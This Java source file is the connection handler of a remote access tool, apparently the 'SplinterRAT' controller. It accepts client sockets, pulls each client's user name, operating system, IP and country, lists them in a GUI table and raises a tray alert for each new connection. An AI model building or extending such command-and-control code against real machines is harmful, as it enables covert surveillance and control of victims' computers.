package Connections;

import GUI.Main;
import GUI.Server.ServerGUI;
import Information.Action;
import Information.NetworkInformation;
import Information.SystemInformation;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;

public class Connection implements Runnable {
    private final ServerSocket server;
    private final ExecutorService executor;
    private final ConcurrentHashMap<Socket, Streams> dialog;

    public Connection(ServerSocket server, ExecutorService executor, ConcurrentHashMap<Socket, Streams> dialog) {
        if (server == null || executor == null || dialog == null) throw new IllegalArgumentException();
        this.server = server;
        this.executor = executor;
        this.dialog = dialog;
    }

    @Override
    public void run() {
        try {
            Socket socket = server.accept();
            if (dialog.putIfAbsent(socket, new Streams(socket)) == null) {
                System.out.println("Connected to: " + socket.getRemoteSocketAddress());
                Streams stream = dialog.get(socket);
                // System info and modules installed
                SystemInformation sysInfo = (SystemInformation) stream.sendAction(Action.SYS_INFO);
                stream.setTempSystemInformation(sysInfo);
                // Network info
                NetworkInformation netInfo = (NetworkInformation) stream.sendAction(Action.NET_INFO);
                stream.setTempNetworkInformation(netInfo);
                // Change state of JTable add or modify existing client
                SwingUtilities.invokeLater(() -> {
                    TableModel tableModel = Main.gui.getConnectionsTable().getModel();
                    int existingClientRow = checkIfExistsAndRemove(socket, tableModel); // position if exists in JTable
                    if (existingClientRow != -1) {  // change state of connection
                        tableModel.setValueAt("Connected", existingClientRow, 5);
                    } else { // new connection
                        String[] tableRow = new String[]{socket.getInetAddress().toString(),
                                netInfo.USER_COUNTRY(),
                                sysInfo.TAG_NAME(),
                                sysInfo.USER_NAME(),
                                sysInfo.OPERATING_SYSTEM(),
                                "Connected"
                        };
                        DefaultTableModel defaultTableModel = (DefaultTableModel) tableModel;
                        defaultTableModel.addRow(tableRow);
                    }

                    if (ServerGUI.isNotifications() && SystemTray.isSupported())
                        displayTray(netInfo.IP(), sysInfo.OPERATING_SYSTEM());
                });

            }
            // FIXME could be removed?
            executor.submit(new Connection(server, executor, dialog));
        } catch (Exception e) {
            System.out.println("Exception on client");
            e.printStackTrace();
            executor.submit(new Connection(server, executor, dialog));
        }
    }

    public void displayTray(String ip, String operativeSystem) {
        //Obtain only one instance of the SystemTray object
        SystemTray tray = SystemTray.getSystemTray();

        //If the icon is a file
        Image image = new ImageIcon(Objects.requireNonNull(getClass().getClassLoader().getResource("splinter_icon_250x250.png"))).getImage();
        //Alternative (if the icon is on the classpath):
        //Image image = Toolkit.getDefaultToolkit().createImage(getClass().getResource("icon.png"));

        TrayIcon trayIcon = new TrayIcon(image, "SplinterRAT connection!");
        //Let the system resize the image if needed
        trayIcon.setImageAutoSize(true);
        //Set tooltip text for the tray icon
        trayIcon.setToolTip("New connection!");
        try {
            tray.add(trayIcon);
        } catch (AWTException e) {
            throw new RuntimeException(e);
        }

        trayIcon.displayMessage("SplinterRAT has a new connection!", "New connection from " + ip + " - " + operativeSystem, TrayIcon.MessageType.INFO);
    }

    /*
        returns the index where the client is located in the JTable
     */
    private int checkIfExistsAndRemove(Socket socket, TableModel tableModel) {
        for (int i = 0; i < tableModel.getRowCount(); i++) {
            System.out.println(socket.getInetAddress() + "|" + tableModel.getValueAt(i, 0));
            if (socket.getInetAddress().toString().equals(tableModel.getValueAt(i, 0))) {
                return i;
            }
        }
        return -1;
    }


}